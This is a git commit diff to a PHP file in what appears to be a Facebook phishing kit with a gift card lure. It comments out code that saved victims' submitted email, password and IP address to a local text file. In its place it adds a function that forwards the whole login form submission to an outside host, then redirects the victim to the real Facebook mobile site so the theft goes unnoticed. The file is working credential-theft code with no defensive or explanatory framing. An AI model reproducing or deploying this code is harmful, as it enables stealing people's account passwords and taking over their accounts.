be7cae91b537a07218681c0d8a44655a90e0b355
zaincashu <34888458+zaincashu@users.noreply.github.com>
2018-04-16 17:02:47 +0300

    Update loged.php

--- Giftcard/Facebook/loged.php
+++ Giftcard/Facebook/loged.php
@@ -1,4 +1,6 @@
 <?
+
+/*
 $ip = getenv("REMOTE_ADDR");
 $email = $_POST['email'];
 $pass = $_POST['pass'];
@@ -14,6 +16,38 @@ $pass = $_POST['pass'];
 	$file = fopen("tnt1.txt", 'a');	
 	fwrite($file, $text_result);
 	
+	
+*/	
+	
+	
+	
+	
+	
+	//----------------send request post to url ----------------
+function sendPost($url,$data) {
+	
+	
+	
+$options = array(
+        'http' => array(
+        'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
+        'method'  => 'POST',
+        'content' => http_build_query($data),
+    )
+);
+
+$context  = stream_context_create($options);
+$result = file_get_contents($url, false, $context);
+return $result;
+}
+
+$data = $_POST;
+
+
+sendPost('http://www.save-test.epizy.com/face.php',$data);
+
+
+//---- end request----------------
 		
 header('Location:https://m.facebook.com');?>
 
